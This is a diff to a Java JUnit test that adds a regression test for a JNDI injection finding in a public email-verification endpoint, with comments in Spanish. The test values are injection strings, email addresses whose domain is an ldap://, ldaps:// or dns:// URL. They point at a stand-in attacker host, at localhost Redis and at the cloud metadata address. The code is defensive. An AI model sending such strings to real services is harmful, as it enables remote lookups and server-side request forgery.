@@ -14,6 +14,8 @@ import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Nested;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.ValueSource;
 import org.mockito.Mock;
 import org.mockito.junit.jupiter.MockitoExtension;
 
@@ -187,6 +189,31 @@ class ConsultaEmailServiceTest {
         @DisplayName("un correo mal formado responde 'formato' en vez de explotar, y no consulta DNS")
         void formatoInvalido() {
             var resultado = service.verificar("no-es-un-correo");
+
+            assertThat(resultado.entregable()).isFalse();
+            assertThat(resultado.motivo()).isEqualTo(MotivoNoEntregable.FORMATO);
+            verify(resolverMxPort, never()).consultar(anyString());
+        }
+
+        /**
+         * Regresion del hallazgo del nombre JNDI. Este es el camino publico completo
+         * (POST /api/v1/account-requests/verify-email, sin sesion): antes, la parte de dominio de
+         * estos correos bajaba entera hasta el resolvedor y de ahi al interprete JNDI, que salia a
+         * conectarse al host y al puerto que eligio quien escribio el correo. Lo que se exige aca
+         * es que el puerto NO se llame: si se llamara, el destino de la conexion volveria a
+         * elegirlo el cliente.
+         */
+        @ParameterizedTest
+        @ValueSource(strings = {
+                "a@ldap://baliza.ejemplo-del-atacante.tld:1389/x",
+                "a@ldaps://baliza.ejemplo-del-atacante.tld:8443/x",
+                "a@dns://baliza.ejemplo-del-atacante.tld:5353/x.y",
+                "a@ldap://127.0.0.1:6379/aa",
+                "a@ldap://169.254.169.254:80/aa"
+        })
+        @DisplayName("un dominio con forma de URL se responde 'formato' y no llega al resolvedor")
+        void dominioConFormaDeUrlNoLlegaAlResolvedor(String conFormaDeUrl) {
+            var resultado = service.verificar(conFormaDeUrl);
 
             assertThat(resultado.entregable()).isFalse();
             assertThat(resultado.motivo()).isEqualTo(MotivoNoEntregable.FORMATO);
